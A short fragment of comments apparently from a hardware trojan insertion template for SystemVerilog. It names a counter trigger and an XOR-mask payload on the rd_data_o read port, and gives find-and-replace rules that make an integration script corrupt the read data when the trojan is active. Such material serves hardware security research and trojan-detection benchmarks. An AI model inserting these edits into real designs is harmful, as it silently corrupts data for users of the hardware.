 ...
 *   
 * Trigger: Counter on rd_data_o
 * Payload: Corrupt rd_data_o with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt rd_data_o with XOR
//
// Integration Script Must Modify:
//
// IF rd_data_o is assigned:
//   Find: assign rd_data_o = data_value;
//   Replace: assign rd_data_o = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF rd_data_o is in always_ff:
//   Find: rd_data_o <= data_value;
//   Replace: rd_data_o <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
